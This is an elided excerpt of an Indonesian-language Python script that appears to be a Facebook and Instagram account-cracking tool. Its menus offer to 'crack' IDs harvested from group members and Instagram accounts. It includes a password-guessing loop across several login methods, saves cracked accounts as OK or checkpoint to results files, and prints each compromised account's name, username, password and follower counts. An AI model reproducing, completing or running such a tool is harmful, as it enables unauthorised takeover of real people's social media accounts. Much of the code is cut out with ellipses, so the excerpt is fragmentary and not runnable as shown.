...
def yayanxd():
    ...
    try:
        ...
        print(' %s[•]%s Mohon Gunakan Sc Ini Sewajarnya Saja'%(O,N));time.sleep(2)
        print(' %s[•]%s Banyakin Comlay Biar Dapet Banyak'%(O,N));time.sleep(2)
        print(' %s[•]%s Jangan Lupa Subscribe Channel Aang-XD Dulu:v\n'%(O,N));time.sleep(2)
...
def moch_yayan():
    ...
    print(' [%s01%s] \033[0;96mCrack \033[0;97mID Dari \033[0;93mAnggota grup'%(H,N));time.sleep(0.03)
    ...
    print(' \033[0;97m[%s07%s] \033[0;96mCrack \033[0;93mAkun \033[0;97mInstagram [%sNEW%s]'%(H,N,H,N));time.sleep(0.03)
    print(' [%s08%s] Checkpoint Detedtor'%(H,N));time.sleep(0.03)
    print(' [%s09%s] Setting User Agent'%(H,N));time.sleep(0.03)
...
class __crack__:
                ...
                if pwek == '':
                    ...
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        ...
                        if cin == '':
                            ...
                            print('\n [%s•%s] akun \033[0;92mOK \033[0;97mdisimpan ke > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s•%s] akun \033[0;93mCP \033[0;97mdisimpan ke > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                    ...
                    print('\n [ Silahkan Pilih Metode Untik Login ]\n')
                    print(' [%s1%s] Metode B-API (Crack Cepat)'%(O,N))
                    print(' [%s2%s] Metode mbasic (Crack Lambat)'%(O,N))
                    print(' [%s3%s] Metode mobile (Crack Sangat Lambat)'%(O,N))
                    __yan__(pwek.split(','))
                    break
    ...
    def __api__(self, user, __yan__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write('\r [%s%s%sCrack][%s/%s][OK/%s][CP/%s]'%(O,i,N,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
...
def proses():
    ...
    print('\n [%s!%s] untuk berhenti, tekan ctrl + z\n'%(M,N));time.sleep(0.2)
def log_igeh():
    global cookie
    try:
    ...
    try:
        ...
        with requests.Session() as ses:
            ...
            if "userId" in str(data):
                ...
                cookie = {"ig.txt": masuk}
                jalan("\n %s[%s✓%s] berhasil login ke akun..."%(N,H,N));time.sleep(2)
                exit(" [%s!%s] jalankan ulang perintah nya dengan ketik python prem.py"%(H,N))
            elif "checkpoint_url" in str(data):
                print('\n %s[%s!%s] opshh akun anda terkena checkpoint'%(N,M,N));masuk_ig()
...
def menu_igeh():
    ...
    if pepek in['']:
        ...
        jalan('\n %s[%s?%s] Masukan nama yang ingin kamu cari. contoh : %sMark%s'%(N,O,N,H,N))
...
def crack2(user, pwx):
    ...
    for pas in pwx:
        if looping != 1:
            ...
            if len(status_foll) != 1:
                sys.stdout.write('\r [%s>_%sCrack][%s/%s][Okeh/%s][Cepeh/%s]'%(O,N,str(loping),len(yan),len(ok),len(cp))),
                sys.stdout.flush()
                asww -= 1
            else:
                pass
...
def ingfo(user, pw, status):
    try:
        ...
        if status == "Berhasil":
            print(f"\r {N}[{H}✓{N}] Name      : {H}{nama}                 \n {N}[{H}✓{N}] Username  : {H}{user}                 \n {N}[{H}✓{N}] Password  : {H}{pw}                 \n {N}[{H}✓{N}] Pengikut  : {H}{str(pengikut)}                 \n {N}[{H}✓{N}] Mengikuti : {H}{str(mengikuti)}                 \n")
        elif status == "Checkpoint":
            print(f"\n {N}[{K}X{N}] Name      : {K}{nama}                 \n {N}[{K}X{N}] Username  : {K}{user}                 \n {N}[{K}X{N}] Password  : {K}{pw}                 \n {N}[{K}X{N}] Pengikut  : {K}{str(pengikut)}                 \n {N}[{K}X{N}] Mengikuti : {K}{str(mengikuti)}                 \n")
        else:
            pass
    except: pass
loping= 1
